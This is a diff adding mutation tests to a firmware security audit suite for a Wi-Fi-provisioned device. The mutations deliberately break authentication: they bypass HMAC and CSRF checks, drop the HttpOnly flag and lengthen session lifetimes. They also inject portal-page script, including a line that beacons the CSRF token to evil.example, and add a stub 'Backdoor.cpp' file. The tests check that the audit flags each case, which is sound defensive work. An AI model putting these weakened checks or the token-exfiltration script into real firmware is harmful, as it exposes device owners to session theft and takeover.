@@ -65,8 +65,51 @@ class NetworkAuditTest(unittest.TestCase):
           ('CommandRouter.cpp','WIFI_PROVISION=REFUSED kind=%s reason=%s','WIFI_PROVISION=QUEUED'),
           ('CommandRouter.cpp','seq=%lu kind=%s result=%s','result=COMMITTED'),
         ]
+        # Persistent administrator recognition and the STA router test.
+        mutations += [
+          ('PortalSecurity.cpp','!anyByte(digest, 32)','false'),
+          ('PortalSecurity.cpp','if (!portalDeviceValid(digest, device))','if (false)'),
+          ('PortalSecurity.cpp','diff |= raw[16 + i] ^ tag[i]','diff |= 0'),
+          ('PortalSecurity.cpp','update::hmac256(digest, 32, message, sizeof(message), tag)','memcpy(tag, message, 32)'),
+          ('PortalSecurity.cpp','return current(now, peer, cookie) && tokenEqual(csrf, csrf_);','return current(now, peer, cookie);'),
+          ('PortalSecurity.cpp','now - issued_ < 300000','now - issued_ < 4000000000'),
+          ('HttpTransport.cpp','if (req.remember)','if (true)'),
+          ('HttpTransport.cpp','md_device=%s; HttpOnly;','md_device=%s;'),
+          ('HttpTransport.cpp','Path=/wifi/session; Max-Age=34560000','Path=/; Max-Age=34560000'),
+          ('HttpTransport.cpp','if (req.local_authorized && !portal_.current(now, req.peer, req.cookie))','if (!portal_.current(now, req.peer, req.cookie))'),
+          ('HttpTransport.cpp','{"/wifi/session", HTTP_POST','{"/wifi/session", HTTP_GET'),
+          ('HttpTransport.cpp','r.remember = read == 81 && memcmp(body + 70, "&remember=1", 11) == 0','r.remember = read > 70'),
+          ('HttpTransport.h','WIFI_STATUS,','WIFI_SESSION, WIFI_STATUS,'),
+          ('WifiManager.cpp','const bool proven = match && now - test_stable_since_ >= kStaTestHoldMs;','const bool proven = match;'),
+          ('WifiManager.cpp','transaction_.update(now, proven, link_up, critical)','transaction_.update(now, link_up, link_up, critical)'),
+          ('WifiManager.cpp','if (!match) test_stable_ = false;','if (!match) {}'),
+          ('WifiManager.cpp','!sta_link_.load()','true'),
+        ]
         for mutation in mutations:
             with self.subTest(mutation=mutation):self.assertTrue(self.check(mutation))
+    def test_portal_page(self):
+        page=(audit.SKETCH_DIR/'src/network/PortalPage.h').read_text()
+        def check(text):
+            audit.failures.clear();audit.check_portal_page_text(text);return list(audit.failures)
+        self.assertEqual(check(page),[])
+        script='<script>\n'
+        for old,new in [
+            ('<script>\n','<script src="https://cdn.example/x.js"></script><script>\n'),
+            (script,script+"new Image().src='http://evil.example/?'+csrf;\n"),
+            (script,script+"document.body.innerHTML=wf.ap_ssid;\n"),
+            (script,script+"document.cookie='md_device='+csrf;\n"),
+            (script,script+"store.set('md_csrf',csrf);\n"),
+            (script,script+"localStorage.setItem('t',csrf);\n"),
+            (script,script+"fetch('/wifi/login?token='+csrf);\n"),
+            (script,script+"fetch('/servo/move');\n"),
+            ('POLL_MS=4000','POLL_MS=200'),
+            ('<header class="top">','<p>HARDWARE VALIDATED</p><header class="top">'),
+            ('<header class="top">','<p>Firmware offline candidate.</p><header class="top">'),
+            ('<button data-page="ota">OTA</button>',''),
+            ("store.set('md_login',String(sessionAt))","store.set('md_login',token)"),
+        ]:
+            with self.subTest(old=old,new=new):
+                self.assertIn(old,page);self.assertTrue(check(page.replace(old,new,1)))
     def test_second_writer(self):
         audit.failures.clear()
         files=self.files+[(audit.SKETCH_DIR/'src/network/Backdoor.cpp','nvs_set_blob(h,k,b,n);')]
